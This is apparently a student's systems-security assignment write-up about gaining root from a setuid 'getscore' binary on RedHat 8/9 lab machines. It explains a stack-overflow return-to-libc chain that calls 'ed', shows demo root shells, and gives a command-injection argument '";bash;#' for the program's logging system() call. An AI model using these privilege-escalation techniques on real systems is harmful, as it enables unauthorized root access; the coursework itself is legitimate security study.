# Systems Security Assignment 1 - Stack Smashing

## Exploit Discovery

In `getscore.c`, we pass 2 command line args that get `strcat`ed together with a
color between in `get_score`. However, the command line args can be arbitrarily
long [1]. This means that we can overflow our buffer and overwrite the saved eip
for the `get_score` frame.

Our situation is that the compiled binary has the setuid bit turned on. Meaning
if we can get the program to exhibit behavior that it wasn't programmed for, we
can run code as root, and hopefully get a root shell open.

At first I thought it would be simple enough to use Aleph One's shellcode that
was provided in class. But I thought it would be more fun to not actually
execute any code that's not already in the binary or libc. So using a very basic
ROP attack, we can return to the libc function `system()` with `esp` pointing to
a `char *` which points to a string we want `/bin/sh` to execute. In essence, we
want to run the code:

    system("program_that_gives_shell")

Seems simple enough right? We could construct the stack as so:

    |---------|
    | prog    | --+ <-- matching_pattern
    | ram_    |   |
    | that    |   |
    | _giv    |   |
    | es_s    |   +-- &(saved eip) - &(matching_pattern) bytes long
    | hell    |   |
    | \0AAA   |   |
    | ...     |   |
    | AA:A    | --+
    | &system | <-- saved eip
    | ZZZZ    | <-- fake return address for system(), hopefully never executed
    | &buffer | <-- ROP args to system()
    +---------+

This would work on the RedHat 8 installation. However, the RedHat 9 exhibited
some rudimentary ASLR. Namely, the stack addresses seemed to be randomized such
that the `ebp` was one of 64 values when we enter `main()`. I expected there to
be more entropy with ASLR, but 1) this machine is running a very old kernel and
2) this could be partially due to gcc enjoying to align stack allocation on
16-byte boundaries. Either way, it requires knowing the address of the buffer we
just wrote to so we can tell `system()` where to find it. We could just guess
one of the 64 locations on the stack that it could be and keep running the
program until it works, but 1) this isn't a very elegant solution, and b) this
could raise red flags, since at least some errors are logged to `error.log`
(whose group owner is `cybersec`, better not alarm those guys).

So I searched the binary for little tidbits of text that could possibly be
binaries found somewhere on the system that are programmed to give shell access.
I finally found the string I was searching for:

    0x804833a    _IO_stdin_used

What? What program could this possibly be? Sorry, that wasn't exactly the right
address. Recall that C strings are null-terminated character arrays. This means
that we can trivially obtain a pointer to any suffix of a string by pointing at
the start of the suffix. The null byte remains in the same location, and so the
end of the suffix will be the end of the original string. This means we can get
the string `"ed"` by pointing at the second to last character in the string:

    0x8048346    ed

If you are not familiar, before we had vim we had vi, and before vi we had punch
cards. No, actually, there was this program called `ed` that was what was called
a line editor. It essentially acted like a shell, but instead the commands being
programs that carry out different tasks, it took commands that edit different
parts of your file. However, it also has one very nice feature: It can execute
arbitrary shell commands itself and print the result. Which means we can run say
`bash` from inside of `ed` and have a root shell!

[1] In actuality this depends on variables set in limits.h, but there are
131072 bytes available for args + environ on RHL8

# Stack layout

    +---------+
    | AAAA    | --+ <-- matching_pattern
    | AAAA    |   |
    | AAAA    |   +-- &(saved eip) - &(matching_pattern) bytes long
    | ...     |   |
    | AA:A    | --+
    | &system | <-- saved eip
    | ZZZZ    | <-- fake return address for system(), hopefully never executed
    | &ed     | <-- arg to system(), points to "ed"
    +---------+

## Exploit Generation

    $ python exploit.py 8
    [*] '/home/kevin/classes/systems_security/assignment1/getscore-rhl8'
        Arch:     i386-32-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0x8048000)
        RWX:      Has RWX segments
    $ scp payload* syssec8:
    kevin@192.168.124.80's password:
    payload1                                                               100%  134    48.6KB/s   00:00
    payload2                                                               100%   17     6.7KB/s   00:00


    $ python exploit.py 9
    [*] '/home/kevin/classes/systems_security/assignment1/getscore-rhl9'
        Arch:     i386-32-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0x8048000)
        RWX:      Has RWX segments
    $ scp payload* syssec9:
    payload1                                                               100%  134    66.3KB/s   00:00
    payload2                                                               100%   17    13.4KB/s   00:00

## RedHat Linux 8 Demo

    [kevin@localhost course_scores]$ whoami
    kevin
    [kevin@localhost course_scores]$ ls -al
    total 40
    drwxr-xr-x    2 root     root         4096 Aug 25 07:17 .
    drwxr-xr-x    5 root     root         4096 Aug 25 05:51 ..
    -rw-r--r--    1 root     cybersec       73 Jul 19  2012 error.log
    -rwsr-xr-x    1 root     root        13587 Aug 25  2009 getscore
    -rw-rw-r--    1 kevin    kevin         134 Aug 22 05:48 payload1
    -rw-rw-r--    1 kevin    kevin          17 Aug 22 05:48 payload2
    -rw-------    1 root     root           87 Aug 23  2010 score.txt
    [kevin@localhost course_scores]$ ./getscore "$(cat payload1)" "$(cat payload2)"
    !bash
    [root@localhost course_scores]# whoami
    root
    [root@localhost course_scores]# cat score.txt
    Mary Doe:123-45-6789:A:an excellent student
    Tom Smith:567-89-1234:B:pay more attention

## RedHat Linux 9 Demo

    [guest@localhost getscore]$ whoami
    guest
    [guest@localhost getscore]$ ls -al
    total 40
    drwxrwxr-x    2 guest    guest        4096 Sep 25 23:00 .
    drwx------   11 guest    guest        4096 Sep 25 22:59 ..
    -rwsr-xr-x    1 root     root        13767 Sep 25 01:34 getscore
    -rw-rw-r--    1 guest    guest        1607 Sep 24 00:55 getscore.c
    -rwxrwxr-x    1 guest    guest         134 Sep 25 22:58 payload1
    -rwxrwxr-x    1 guest    guest          17 Sep 25 22:58 payload2
    -rw-------    1 root     root           88 Sep 24 00:55 score.txt
    [guest@localhost getscore]$ cat score.txt
    cat: score.txt: Permission denied
    [guest@localhost getscore]$ ./getscore "$(cat payload1)" "$(cat payload2)"
    !bash
    [root@localhost getscore]# whoami
    root
    [root@localhost getscore]# cat score.txt
    Mary Doe:123-45-6789:A+:an excellent student
    Tom Smith:567-89-1234:B:pay more attention

## Running the exploit generator

    USAGE: ./exploit.py [ 8 | 9 ]

Running `exploit.py` requires python 2.7 and
[pwntools](https://github.com/Gallopsled/pwntools) (a simple `pip install
pwntools` should do). Then select the target environment by passing either `8`
or `9` as the first command line argument. This script will output two files,
`payload1` and `payload2`. Note that there are characters in these files that
will get interpreted as shell characters. So you can't just copy/paste the
contents of the two files as the command line args. Rather, it is best to run
the program as such:

    ./getscore "$(cat payload1)" "$(cat payload2)"
    
The `"$()"` construct guaranteed that the two strings will be passed in raw.
Additionally, I've included the correct argument strings for both RedHat 8 and 9
in `rhl8-payload1`, `rhl8-payload2`, `rhl-payload2`, and `rhl-payload2`.

## Additional vulnerability

Additionally, the original call to `system()` in the code is insecure:

    sprintf(command, "echo \"%s: Invalid user name or SSN: %s,%s\"|cat >> error.log", 
        ctime(&current_time), argv[1], argv[2]);
    if (system(command)){
        perror("Logging");
    }

Since we are interpolating strings without properly shell-escaping anything, we
can insert shell commands if carefully constructed. For example, we can insert
the string `";bash;#"` as the first argument and the empty string as the second.
So then the call to system will become something like:

    echo "Fri Sep 23 09:13:35 2017
    : Invalid user name or SSN: ";bash;#,%s\"|cat >> error.log
    
This translates to a call to `echo` (quoted strings in posix shell can contain
newlines), followed by a call to bash, and the rest is commented out. Here's a
demo:

    [kevin@localhost kevin]$ ls -l getscore score.txt 
    -rwsr-xr-x    1 root     root        13587 Aug 25  2009 getscore
    -rw-------    1 root     root           87 Aug 23  2010 score.txt
    [kevin@localhost kevin]$ cat score.txt 
    cat: score.txt: Permission denied
    [kevin@localhost kevin]$ ./getscore '";bash;#' ''
    Invalid user name or SSN.
    Fri Sep 23 09:13:35 2017
    : Invalid user name or SSN: 
    [root@localhost kevin]# cat score.txt 
    Mary Doe:123-45-6789:A+:an excellent student
    Tom Smith:567-89-1234:B:pay more attention
